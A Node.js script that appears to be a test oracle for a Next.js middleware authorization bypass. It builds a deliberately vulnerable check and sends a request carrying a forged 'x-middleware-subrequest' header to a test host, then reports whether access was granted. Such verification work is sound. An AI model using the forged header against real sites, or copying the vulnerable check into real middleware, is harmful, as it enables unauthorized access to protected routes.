const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const markerDir = path.join(os.tmpdir(), 'oracle-next-auth-bypass-' + Date.now() + '-' + Math.random().toString(16).slice(2));
  fs.mkdirSync(markerDir, { recursive: true });

  const { NextRequest } = require('next/dist/server/web/spec-extension/request');
  const { NextResponse } = require('next/dist/server/web/spec-extension/response');

  function vulnerableStyleMiddlewareAuthCheck(req) {
    const sub = req.headers.get('x-middleware-subrequest') || '';
    const hasAuth = !!req.headers.get('authorization');
    const bypass = sub.includes('middleware') || sub.includes('src/middleware');
    return hasAuth || bypass;
  }

  const benignReq = new NextRequest('https://example.test/protected');
  const benignRes = NextResponse.next();
  const benignAllow = vulnerableStyleMiddlewareAuthCheck(benignReq);

  if (!benignReq || !benignRes || typeof benignRes.headers.get !== 'function') {
    throw new Error('benign operation failed to construct middleware objects');
  }
  if (benignAllow !== false) {
    throw new Error('benign check unexpectedly allowed unauthenticated request');
  }

  operation_completed = true;

  const forgedValue = 'src/middleware:src/middleware:middleware';
  const forgedHeaders = new Headers();
  forgedHeaders.set('x-middleware-subrequest', forgedValue);

  const maliciousReq = new NextRequest('https://example.test/protected', { headers: forgedHeaders });
  const observedSub = maliciousReq.headers.get('x-middleware-subrequest');
  const maliciousAllow = vulnerableStyleMiddlewareAuthCheck(maliciousReq);

  const sentinelPreserved = observedSub === forgedValue;

  // Keep vulnerable behavior as succeeded, but block fixed behavior when header is sanitized/ignored.
  // Exploit requires both: forged header survives AND bypass logic grants access.
  exploit_succeeded = sentinelPreserved && maliciousAllow === true;

  evidence = JSON.stringify({
    markerDir,
    benignAllow,
    observedSub,
    sentinelPreserved,
    maliciousAllow,
    vulnerableSignal: exploit_succeeded
  });

  finish();
} catch (err) {
  if (!operation_completed) {
    exploit_succeeded = false;
    evidence = 'setup_or_benign_failure:' + (err && err.message ? err.message : String(err));
  } else {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_by_exception:' + (err && err.message ? err.message : String(err));
  }
  finish();
}
